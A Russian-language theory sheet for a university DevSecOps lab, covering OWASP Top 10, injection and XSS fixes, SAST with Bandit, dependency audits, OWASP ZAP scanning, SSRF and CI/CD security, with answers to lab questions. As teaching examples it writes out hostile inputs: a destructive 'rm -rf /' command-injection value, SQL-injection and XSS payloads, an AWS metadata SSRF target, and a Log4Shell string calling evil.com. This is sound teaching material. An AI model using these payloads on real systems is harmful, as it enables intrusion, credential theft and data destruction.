# Теория: Безопасность в жизненном цикле разработки ПО (Лаб 13)

## 1. DevSecOps и «Shift Left Security»

**DevSecOps** — интеграция безопасности на всех этапах SDLC (Dev + Sec + Ops).

**Три принципа:**
- **Shared Responsibility** — безопасность = ответственность всей команды
- **Automation** — автоматические проверки в CI/CD на каждом коммите
- **Continuous Feedback** — быстрая обратная связь об уязвимостях

**Shift Left** — перенос проверок безопасности как можно раньше:
```
Традиционно:   Код → Тест → Релиз → [Проверка безопасности]
Shift Left:    [Threat Modeling] → Код[SAST/SCA] → Тест[DAST] → Релиз
```

**Стоимость исправления уязвимости:**
| Этап | Стоимость |
|---|---|
| Требования | $1 |
| Проектирование | $5–10 |
| Кодирование | $25–50 |
| Тестирование | $100–200 |
| Эксплуатация | $1000+ |

---

## 2. OWASP Top 10 (2021)

| # | Категория | Пример |
|---|---|---|
| A01 | Broken Access Control | IDOR, нет проверки прав на API |
| A02 | Cryptographic Failures | MD5 для паролей, HTTP вместо HTTPS |
| **A03** | **Injection** | **SQL-инъекции, Command Injection** |
| A04 | Insecure Design | Архитектурные ошибки |
| A05 | Security Misconfiguration | Открытые порты, дефолтные пароли |
| **A06** | **Vulnerable Components** | **Устаревшие библиотеки (Log4Shell)** |
| A07 | Auth Failures | Слабые пароли, нет MFA |
| A08 | Integrity Failures | Небезопасная десериализация |
| A09 | Logging Failures | Нет аудита событий |
| **A10** | **SSRF** | **Запросы к внутренним ресурсам** |

---

## 3. Инъекции (Injection) — A03

### SQL-инъекция

**Уязвимый код (Python):**
```python
# ❌ ОПАСНО — конкатенация строк
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# Атака: user_id = "1 OR 1=1"
# Результат: SELECT * FROM users WHERE id = 1 OR 1=1
# Возвращаются ВСЕ пользователи!
```

**Безопасный код:**
```python
# ✅ ПАРАМЕТРИЗОВАННЫЙ запрос
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))
# Драйвер БД экранирует значение — "1 OR 1=1" воспринимается как строка
```

**Почему параметризация защищает:** база данных разделяет код запроса и данные. Значение `user_id` никогда не интерпретируется как SQL-код, только как строка.

### Command Injection

**Уязвимый код:**
```python
# ❌ ОПАСНО — shell=True с пользовательским вводом
import subprocess
cmd = request.args.get('cmd')
result = subprocess.check_output(cmd, shell=True)
# Атака: cmd = "ls; rm -rf /"
```

**Безопасный код:**
```python
# ✅ Allow-list + shell=False
ALLOWED = ['date', 'whoami', 'uptime']
cmd = request.args.get('cmd', '')
if cmd not in ALLOWED:
    return jsonify({"error": "Command not allowed"}), 403
result = subprocess.check_output([cmd])  # shell=False — без оболочки
```

**Разница `shell=True` vs `shell=False`:**
- `shell=True` — запускает `/bin/sh -c "команда"`, позволяет `;`, `&&`, `|`
- `shell=False` — запускает программу напрямую, без интерпретатора оболочки

### SQL-инъекция в Node.js

```javascript
// ❌ ОПАСНО
db.all(`SELECT * FROM comments WHERE comment LIKE '%${search}%'`);

// ✅ БЕЗОПАСНО — параметризованный запрос
db.all(`SELECT * FROM comments WHERE comment LIKE ?`, [`%${search}%`]);

// ✅ БЕЗОПАСНО — allow-list для динамической сортировки
const ALLOWED_SORT = ['created_at DESC', 'created_at ASC', 'username ASC'];
if (!ALLOWED_SORT.includes(sortParam)) return res.status(400).json({error: 'Invalid sort'});
db.all(`SELECT * FROM comments ORDER BY ${sortParam}`);
```

---

## 4. XSS (Cross-Site Scripting)

**Определение:** внедрение JavaScript-кода в страницу, выполняющегося в браузере жертвы.

### Типы XSS

| Тип | Механизм | Опасность |
|---|---|---|
| **Reflected** | Скрипт в URL-параметре, отражается в ответе | Средняя (нужна ссылка) |
| **Stored** | Скрипт сохранён в БД, отображается всем | Высокая (атакует всех) |
| **DOM-based** | Скрипт через JavaScript на клиенте | Сложно обнаружить |

### Уязвимый код

```javascript
// ❌ innerHTML с пользовательскими данными
html += '<div>' + comment.comment + '</div>';
document.getElementById('result').innerHTML = html;

// ❌ eval с пользовательским вводом
eval(userInput); // НИКОГДА!
```

### Безопасный код

```javascript
// ✅ Создание DOM-элементов через API
const div = document.createElement('div');
div.textContent = comment.comment; // textContent — автоматически экранирует HTML
container.appendChild(div);
```

**В EJS-шаблонах:**
```ejs
<!-- ✅ Безопасно — экранирует HTML -->
<%= comment.comment %>

<!-- ❌ Опасно — raw HTML -->
<%- comment.comment %>
```

### Content Security Policy (CSP)

CSP — HTTP-заголовок, ограничивающий источники ресурсов в браузере:

```javascript
// Express.js
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self'; style-src 'self';"
    );
    next();
});
```

**Режим отчёта (без блокировки):**
```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

CSP защищает даже если разработчик забыл экранировать вывод: браузер не выполнит скрипт из неразрешённого источника.

### Санитизация данных

```javascript
const sanitizeHtml = (input) => {
    if (!input) return '';
    return input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
};
```

---

## 5. Hardcoded Secrets

**Что такое «секреты»:** API-ключи, пароли к БД, JWT-секреты, OAuth-токены, приватные ключи.

```python
# ❌ НИКОГДА ТАК НЕ ДЕЛАТЬ
API_KEY = "sk_test_REPLACED"
DATABASE_URL = "postgresql://admin:SuperSecret123!@db.example.com/prod"
```

**Почему опасно:**
- Git-история хранит всё — удаление из HEAD не удаляет из истории
- Публичные репозитории сканируются ботами за секунды
- Даже приватные репо компрометируются при утечке токена

**Правильно — переменные окружения:**
```python
import os

API_KEY = os.environ.get('API_KEY')
if not API_KEY:
    raise ValueError("API_KEY environment variable not set")
```

**Запуск:**
```bash
export API_KEY="your-secure-key"
python app.py
```

**Продвинутый вариант — HashiCorp Vault:**
```python
import hvac
client = hvac.Client(url='https://vault.internal:8200',
                     token=os.environ.get('VAULT_TOKEN'))
secret = client.secrets.kv.v2.read_secret_version(mount_point='kv', path='prod/db')
db_password = secret['data']['data']['password']
```

---

## 6. SAST — Статический анализ (Bandit)

**SAST (Static Application Security Testing)** — анализ исходного кода без его выполнения.

**Bandit** — Python-инструмент для поиска уязвимостей в коде.

### Установка и запуск

```bash
pip install bandit

# Базовый запуск
bandit app.py

# С уровнем серьёзности (low/medium/high)
bandit app.py -ll   # только low и выше
bandit app.py -l    # только medium и выше

# Генерация отчёта
bandit app.py -f html -o bandit_report.html
bandit app.py -f json -o bandit_report.json

# Исключить конкретные проверки
bandit app.py -s B608  # пропустить B608 (hardcoded SQL)
```

### Что находит Bandit

| Код | Уязвимость | Серьёзность |
|---|---|---|
| B105 | Hardcoded password | Low |
| B106 | Hardcoded password as argument | Low |
| B108 | Probable insecure temp file | Medium |
| **B201** | **Flask debug=True** | **High** |
| **B323** | **Unverified HTTPS context** | **Medium** |
| **B501** | **Weak cryptographic key** | **Medium** |
| **B602** | **subprocess with shell=True** | **High** |
| **B608** | **SQL injection** | **Medium** |

### Конфигурационный файл `.bandit`

```yaml
# .bandit
skips: ['B105']          # пропустить проверки
tests: ['B201', B602']   # только эти проверки
exclude_dirs: ['tests', 'venv']  # исключить папки
```

### Что Bandit НЕ находит

- Логические ошибки в бизнес-логике (IDOR, broken access control)
- Уязвимости в конфигурации сервера
- Уязвимости во время выполнения (runtime)
- XSS на стороне клиента (JavaScript)
- Проблемы аутентификации и авторизации

---

## 7. SCA — Анализ зависимостей

**SCA (Software Composition Analysis)** — поиск уязвимостей в сторонних библиотеках.

### npm audit (Node.js)

```bash
# Установка уязвимых версий специально
npm install express@4.16.0 axios@0.18.0 ejs@2.6.1

# Аудит
npm audit
npm audit --json > audit-report.json

# Автоматическое исправление
npm audit fix
npm audit fix --force  # для major-версий

# Обновить конкретный пакет
npm install express@latest
```

**Пример вывода npm audit:**
```
axios  <0.21.2
Severity: moderate
Server-Side Request Forgery in axios - https://npmjs.com/advisories/...
fix available via `npm audit fix --force`
```

### pip-audit (Python)

```bash
pip install pip-audit
pip-audit
pip-audit -r requirements.txt
pip-audit --format json > audit.json
```

### Snyk

```bash
npm install -g snyk
snyk auth
snyk test
snyk monitor  # Мониторинг в облаке
```

**Разница npm audit vs snyk:**
- `npm audit` — только NPM Advisory Database
- `snyk` — несколько баз (NVD, GitHub Advisory, собственная), глубже транзитивные зависимости, fix-советы

---

## 8. DAST — Динамическое тестирование (OWASP ZAP)

**DAST (Dynamic Application Security Testing)** — сканирование работающего приложения («чёрный ящик»).

**OWASP ZAP** — самый популярный open-source DAST-инструмент.

### Запуск через Docker

```bash
# Пассивное сканирование (без активных атак)
docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable \
    zap-baseline.py -t http://localhost:3000 -r zap_report.html

# Полное активное сканирование
docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable \
    zap-full-scan.py -t http://localhost:3000 -r full_report.html

# Для API
docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable \
    zap-api-scan.py -t http://localhost:3000/swagger.json -r api_report.html
```

### Как ZAP обнаруживает XSS

1. **Spider** — обходит все страницы, собирает формы и URL-параметры
2. **Active Scan** — для каждого параметра отправляет тестовые payload'ы:
   - `<script>alert(1)</script>`
   - `"><img src=x onerror=alert(1)>`
   - `javascript:alert(1)`
3. **Анализ ответа** — ищет, отражается ли payload в ответе без экранирования

### Passive vs Active сканирование

| | Пассивное | Активное |
|---|---|---|
| Воздействие | Нет атак | Отправляет exploit payload'ы |
| Данные | Может изменить | Безопасно |
| Время | Быстро | Медленно (часы) |
| Когда | Всегда | Только в тестовой среде |

---

## 9. SSRF (Server-Side Request Forgery) — A10

**SSRF** — приложение выполняет HTTP-запросы по URL, контролируемому пользователем.

```javascript
// ❌ УЯЗВИМЫЙ КОД — axios принимает любой URL
app.get('/api/external', async (req, res) => {
    const url = req.query.url;
    const response = await axios.get(url); // Атака: url=http://169.254.169.254/...
    res.json(response.data);
});
```

**Что можно атаковать:**
- `http://169.254.169.254/latest/meta-data/` — метаданные AWS (ключи доступа!)
- `http://localhost:8080/admin` — внутренние сервисы
- `http://192.168.1.1/` — серверы внутренней сети

**Защита:**
```javascript
const { URL } = require('url');
const ALLOWED_HOSTS = ['api.example.com', 'api2.example.com'];

app.get('/api/external', async (req, res) => {
    try {
        const parsed = new URL(req.query.url);
        if (!ALLOWED_HOSTS.includes(parsed.hostname))
            return res.status(403).json({ error: 'Host not allowed' });
        if (parsed.protocol !== 'https:')
            return res.status(403).json({ error: 'Only HTTPS allowed' });
        const response = await axios.get(req.query.url);
        res.json(response.data);
    } catch { res.status(400).json({ error: 'Invalid URL' }); }
});
```

---

## 10. Сравнение SAST / DAST / SCA

| Характеристика | SAST | DAST | SCA |
|---|---|---|---|
| Когда | При коммите/PR | На staging | При сборке |
| Код нужен | Да (белый ящик) | Нет (чёрный ящик) | Только манифест |
| Что находит | SQLi, XSS в коде | Конфигурация, логика | CVE в зависимостях |
| Ложные срабатывания | Высокие | Средние | Низкие |
| Скорость | Быстро (мин) | Медленно (часы) | Быстро (сек) |
| Инструменты | Bandit, Semgrep | OWASP ZAP, Burp | npm audit, Snyk |

**Вывод:** нужны все три класса. SAST + SCA на каждом PR, DAST на staging.

---

## 11. Безопасные практики кодирования

### Валидация входных данных

```python
import re

# Allow-list (позитивная валидация) — лучший подход
def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

# Никогда не использовать block-list (черный список) — всегда можно обойти
```

### Хэширование паролей

```python
# ❌ ОПАСНО — MD5, SHA1 без соли
import hashlib
hash = hashlib.md5(password.encode()).hexdigest()

# ✅ ПРАВИЛЬНО — bcrypt или argon2
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

### Обработка ошибок

```python
# ❌ Выводим stack trace пользователю
@app.errorhandler(Exception)
def handle_error(e):
    return str(e), 500  # Атакующий видит структуру приложения!

# ✅ Логируем на сервере, пользователю — общее сообщение
import logging
@app.errorhandler(Exception)
def handle_error(e):
    logging.exception("Internal error")
    return jsonify({"error": "Internal server error"}), 500
```

---

## 12. Конвейер безопасности в CI/CD

```
Коммит → [Pre-commit: git-secrets] → PR → [SAST + SCA + Secrets Scan]
                                              ↓ критические = блокировка PR
                                         Сборка → [Container Scan]
                                              ↓
                                         Staging → [DAST: OWASP ZAP]
                                              ↓ уязвимости = блокировка деплоя
                                         Production → [Runtime Monitoring]
```

### GitHub Actions пример

```yaml
name: Security Scan
on: [pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Python SAST (Bandit)
        run: pip install bandit && bandit -r . -ll
      
      - name: Node.js SCA (npm audit)
        run: npm audit --audit-level=high
      
      - name: Snyk test
        run: npx snyk test
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

---

## 13. Ключевые кейсы

### Log4Shell (CVE-2021-44228, декабрь 2021)

- **Библиотека:** Apache Log4j (Java), используется в миллионах приложений
- **Уязвимость:** строка `${jndi:ldap://evil.com/exploit}` в логах → RCE
- **CVSS:** 10.0 (максимум)
- **Урок:** SCA + SBOM необходимы для быстрой оценки влияния новых CVE

### SolarWinds (2020)

- **Атака:** компрометация CI/CD пайплайна, бэкдор в официальных обновлениях
- **Масштаб:** 18 000 организаций, включая правительство США
- **Урок:** CI/CD — критическая инфраструктура, требует такой же защиты как production

---

## 14. Ответы на вопросы лабораторных

### Лаб 13.1 (SAST / Bandit)

**Q: Какие уязвимости обнаружил Bandit?**
- B105/B106 — hardcoded passwords (API_KEY в коде)
- B201 — `app.run(debug=True)` — в production опасно, раскрывает отладчик
- B602 — `subprocess.check_output(cmd, shell=True)` — Command Injection
- B608 — SQL built with string formatting — SQL Injection

**Q: Почему параметризованные запросы защищают от SQLi?**
БД разделяет SQL-структуру и данные. Значение передаётся отдельно и никогда не интерпретируется как SQL-код, только как строковое значение.

**Q: Разница shell=True vs shell=False?**
`shell=True` запускает команду через `/bin/sh -c`, что позволяет использовать `;`, `&&`, `|` для цепочки команд. `shell=False` запускает программу напрямую — пользовательский ввод не может изменить логику выполнения.

**Q: Что SAST НЕ обнаруживает?**
- Ошибки логики (IDOR, нарушение контроля доступа)
- Уязвимости конфигурации среды (открытые порты)
- Уязвимости, возникающие при взаимодействии компонентов
- Проблемы в сторонних библиотеках (это задача SCA)

### Лаб 13.2 (SCA / OWASP ZAP)

**Q: Какие CVE в зависимостях?**
- `axios@0.18.0` → CVE-2023-45857 (SSRF), CVE-2020-28168
- `ejs@2.6.1` → CVE-2022-29078 (RCE через шаблоны)
- `express@4.16.0` → несколько Low/Medium severity

**Q: Разница npm audit vs snyk?**
`npm audit` — только npm Advisory Database, бесплатно. `snyk` — несколько баз данных, глубокий анализ транзитивных зависимостей, платный, предоставляет пошаговые инструкции по исправлению.

**Q: Почему CSP эффективен против XSS?**
Даже если XSS-скрипт внедрён в HTML, браузер проверяет его источник по политике. Если источник не разрешён — скрипт не выполнится. CSP — второй слой защиты после экранирования.

**Q: Ограничения DAST vs SAST?**
DAST не видит код, только внешнее поведение. Не находит уязвимости в ветках кода, которые не были вызваны при сканировании. Медленнее. Может повредить тестовые данные активным сканированием.

---

## 15. Быстрые команды (шпаргалка)

```bash
# ── Python / Bandit ──────────────────────────────
pip install flask bandit
bandit app.py                          # базовый анализ
bandit app.py -f html -o report.html  # HTML-отчёт
bandit app.py -r -ll                  # рекурсивно, medium+
bandit -c .bandit app.py              # с конфигом

# ── Node.js / npm ────────────────────────────────
npm audit                              # аудит зависимостей
npm audit fix                          # автоисправление
npm audit fix --force                  # включая major
npm outdated                           # устаревшие пакеты
npx snyk test                          # snyk без установки

# ── OWASP ZAP (Docker) ──────────────────────────
docker pull owasp/zap2docker-stable
docker run -v $(pwd):/zap/wrk -t owasp/zap2docker-stable \
    zap-baseline.py -t http://localhost:3000 -r report.html

# ── Проверка заголовков CSP ─────────────────────
curl -I http://localhost:3000 | grep -i content-security-policy

# ── Тест SQL-инъекции ───────────────────────────
curl "http://localhost:5000/user?id=1 OR 1=1"
curl "http://localhost:5000/search?username=admin' OR '1'='1"

# ── Тест XSS ────────────────────────────────────
curl -X POST http://localhost:3000/comment \
    -d "username=<script>alert('xss')</script>&comment=test"

# ── Переменные окружения ─────────────────────────
export API_KEY="secure-key-here"
echo $API_KEY
unset API_KEY
```
